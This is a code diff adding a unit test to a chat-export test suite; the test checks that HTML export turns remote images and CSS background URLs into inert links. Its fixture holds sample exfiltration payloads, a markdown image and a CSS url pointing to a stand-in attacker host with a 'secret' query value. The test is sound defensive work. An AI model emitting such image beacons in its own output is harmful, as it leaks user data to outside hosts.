@@ -383,6 +383,26 @@ describe('exportChatToFormat', () => {
     expect(html).toContain('<title>A &lt;b&gt;&amp;&lt;/b&gt; B chat</title>');
   });
 
+  it('exports an image from another host as a link, so opening the file loads nothing', async () => {
+    await exportChatToFormat(
+      [
+        {
+          role: 'assistant',
+          content:
+            'Chart: ![chart](https://evil.example/c.png?d=secret)\n\n<p style="background:url(https://evil.example/b)">x</p>'
+        }
+      ],
+      settings,
+      'html',
+      { appName: 'App' }
+    );
+
+    const html = await readBlob(downloads[0].blob);
+    expect(html).not.toMatch(/<img[^>]+evil\.example/);
+    expect(html).not.toContain('url(https://evil.example');
+    expect(html).toContain('href="https://evil.example/c.png?d=secret"');
+  });
+
   it('escapes the app name and every chat setting in the HTML export', async () => {
     // Variable values are typed into the chat's start form, so like the title they are
     // attacker-controlled and must not become live markup in the downloaded document.
